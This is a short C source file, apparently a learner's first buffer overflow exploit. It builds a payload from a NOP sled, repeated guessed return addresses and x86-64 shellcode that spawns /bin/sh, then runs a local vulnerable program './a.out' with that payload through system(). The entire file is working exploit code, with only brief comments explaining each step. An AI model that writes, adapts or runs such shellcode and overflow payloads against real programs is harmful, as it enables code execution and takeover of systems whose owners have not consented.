/* This is my first exploit writen by my hands */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This is my binary code to execute a shell */
char shellcode[] =
    "\xb8\x00\x00\x00\x00\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    "\x53\xb8\x3b\x00\x00\x00\x48\x89\xe7\x0f\x05";


int main(int argc, char *argv[])
{
    unsigned int i, *ptr, offset = 270; 
    unsigned long ret;
    char *command, *buffer;

    /* First lets create our command */
    command = (char *) malloc(200);
    bzero(command, 200);

    /* Now copy the executable binary file */
    strcpy(command, "./a.out \'");
    
    buffer = command + strlen(command); /* get the address */
    
    if (argc > 1)
        offset = atoi(argv[1]);

    /* To create our return address for that reason
       use the address from the variable i
     */
    ret = (unsigned long) &i - offset;

    /* Fill all the buffer with the return address */
    for (i = 0; i < 160; i += 8)
        *((unsigned long *) (buffer + i)) = ret;

    /* Now we add the nop instructions */
    memset(buffer, 0x90, 60);

    /* And the end we add our code */
    memcpy(buffer + 60, shellcode, sizeof(shellcode) - 1);

    /* Add the \ character at the end */
    strcat(command, "\'");

    /* And finally run the exploit */
    system(command);

    /* Now we free the memory */
    free(command);
    
    return 0;
}


